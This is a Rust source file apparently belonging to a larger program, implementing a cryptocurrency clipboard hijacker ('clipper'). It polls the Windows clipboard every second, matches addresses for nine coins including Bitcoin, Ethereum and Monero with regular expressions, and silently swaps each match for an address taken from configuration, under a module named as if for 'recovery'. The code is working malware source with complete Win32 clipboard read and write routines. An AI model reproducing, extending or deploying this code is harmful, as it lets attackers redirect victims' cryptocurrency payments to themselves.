use crate::recovery::settings::RecoveryControl;
use regex::Regex;
use tokio::time::{Duration, sleep};
use tracing::{debug, info};
use once_cell::sync::Lazy;

static BTC_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-HJ-NP-Z0-9]{25,59})$").unwrap());
static ETH_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^0x[a-fA-F0-9]{40}$").unwrap());
static LTC_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$").unwrap());
static XMR_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$").unwrap());
static DOGE_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$").unwrap());
static DASH_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^X[1-9A-HJ-NP-Za-km-z]{33}$").unwrap());
static SOL_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^[1-9A-HJ-NP-Za-km-z]{32,44}$").unwrap());
static TRX_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^T[A-Za-z1-9]{33}$").unwrap());
static ADA_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"^addr1[0-9a-z]{58}$").unwrap());

pub async fn run_clipper() {
    let control = RecoveryControl::global();
    if !control.clipper_enabled() {
        return;
    }

    info!("starting Clipper background thread");
    
    let btc = control.btc_address().map(|s| s.to_string());
    let eth = control.eth_address().map(|s| s.to_string());
    let ltc = control.ltc_address().map(|s| s.to_string());
    let xmr = control.xmr_address().map(|s| s.to_string());
    let doge = control.doge_address().map(|s| s.to_string());
    let dash = control.dash_address().map(|s| s.to_string());
    let sol = control.sol_address().map(|s| s.to_string());
    let trx = control.trx_address().map(|s| s.to_string());
    let ada = control.ada_address().map(|s| s.to_string());

    if btc.is_none() && eth.is_none() && ltc.is_none() && xmr.is_none() && doge.is_none() && dash.is_none() && sol.is_none() && trx.is_none() && ada.is_none() {
        debug!("clipper enabled but no addresses configured; exiting clipper");
        return;
    }

    tokio::spawn(async move {
        let mut last_clipboard = String::new();

        loop {
            if let Some(current) = get_clipboard_text() {
                let trimmed = current.trim();
                if trimmed != last_clipboard && !trimmed.is_empty() {
                    let mut replaced = false;
                    let mut new_text = trimmed.to_string();

                    if let Some(target) = &btc {
                        if BTC_REGEX.is_match(trimmed) && trimmed != target {
                            new_text = target.clone();
                            replaced = true;
                        }
                    }

                    if !replaced {
                        if let Some(target) = &eth {
                            if ETH_REGEX.is_match(trimmed) && trimmed != target {
                                new_text = target.clone();
                                replaced = true;
                            }
                        }
                    }

                    if !replaced {
                        if let Some(target) = &ltc {
                            if LTC_REGEX.is_match(trimmed) && trimmed != target {
                                new_text = target.clone();
                                replaced = true;
                            }
                        }
                    }

                    if !replaced {
                        if let Some(target) = &xmr {
                            if XMR_REGEX.is_match(trimmed) && trimmed != target {
                                new_text = target.clone();
                                replaced = true;
                            }
                        }
                    }

                    if !replaced {
                        if let Some(target) = &doge {
                            if DOGE_REGEX.is_match(trimmed) && trimmed != target {
                                new_text = target.clone();
                                replaced = true;
                            }
                        }
                    }

                    if !replaced {
                        if let Some(target) = &dash {
                            if DASH_REGEX.is_match(trimmed) && trimmed != target {
                                new_text = target.clone();
                                replaced = true;
                            }
                        }
                    }

                    if !replaced {
                        if let Some(target) = &sol {
                            if SOL_REGEX.is_match(trimmed) && trimmed != target {
                                new_text = target.clone();
                                replaced = true;
                            }
                        }
                    }

                    if !replaced {
                        if let Some(target) = &trx {
                            if TRX_REGEX.is_match(trimmed) && trimmed != target {
                                new_text = target.clone();
                                replaced = true;
                            }
                        }
                    }

                    if !replaced {
                        if let Some(target) = &ada {
                            if ADA_REGEX.is_match(trimmed) && trimmed != target {
                                new_text = target.clone();
                                replaced = true;
                            }
                        }
                    }

                    if replaced {
                        if set_clipboard_text(&new_text) {
                            info!("clipper: replaced clipboard content with target address");
                            last_clipboard = new_text;
                        }
                    } else {
                        last_clipboard = trimmed.to_string();
                    }
                }
            }
            sleep(Duration::from_millis(1000)).await;
        }
    });
}

fn get_clipboard_text() -> Option<String> {
    #[cfg(windows)]
    {
        use windows::Win32::Foundation::{HWND, HGLOBAL};
        use windows::Win32::System::DataExchange::{OpenClipboard, CloseClipboard, GetClipboardData, IsClipboardFormatAvailable};
        use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock, GlobalSize};
        use windows::Win32::System::Ole::CF_UNICODETEXT;

        unsafe {
            if OpenClipboard(HWND(0)).is_err() {
                return None;
            }
            
            let mut result = None;
            if IsClipboardFormatAvailable(CF_UNICODETEXT.0 as u32).is_ok() {
                if let Ok(handle) = GetClipboardData(CF_UNICODETEXT.0 as u32) {
                    if handle.0 != 0 {
                        let hglobal = HGLOBAL(handle.0 as *mut _);
                        let ptr = GlobalLock(hglobal);
                        if !ptr.is_null() {
                            let size = GlobalSize(hglobal);
                            let len = (size / 2).saturating_sub(1);
                            let slice = std::slice::from_raw_parts(ptr as *const u16, len as usize);
                            let text = String::from_utf16_lossy(slice);
                            let _ = GlobalUnlock(hglobal);
                            result = Some(text.trim_end_matches('\u{0}').to_string());
                        }
                    }
                }
            }
            let _ = CloseClipboard();
            result
        }
    }
    #[cfg(not(windows))]
    {
        None
    }
}

fn set_clipboard_text(text: &str) -> bool {
    #[cfg(windows)]
    {
        use windows::Win32::Foundation::HWND;
        use windows::Win32::System::DataExchange::{OpenClipboard, CloseClipboard, EmptyClipboard, SetClipboardData};
        use windows::Win32::System::Memory::{GlobalAlloc, GlobalLock, GlobalUnlock, GHND};
        use windows::Win32::System::Ole::CF_UNICODETEXT;

        unsafe {
            if OpenClipboard(HWND(0)).is_err() {
                return false;
            }
            
            let mut success = false;
            if EmptyClipboard().is_ok() {
                let utf16: Vec<u16> = text.encode_utf16().chain(std::iter::once(0)).collect();
                let size = utf16.len() * 2;
                
                if let Ok(hglobal) = GlobalAlloc(GHND, size) {
                    let ptr = GlobalLock(hglobal);
                    if !ptr.is_null() {
                        std::ptr::copy_nonoverlapping(utf16.as_ptr(), ptr as *mut u16, utf16.len());
                        let _ = GlobalUnlock(hglobal);
                        
                        if SetClipboardData(CF_UNICODETEXT.0 as u32, HANDLE(hglobal.0 as isize)).is_ok() {
                            success = true;
                        }
                    }
                }
            }
            let _ = CloseClipboard();
            success
        }
    }
    #[cfg(not(windows))]
    {
        let _ = text;
        false
    }
}

#[cfg(windows)]
use windows::Win32::Foundation::HANDLE;
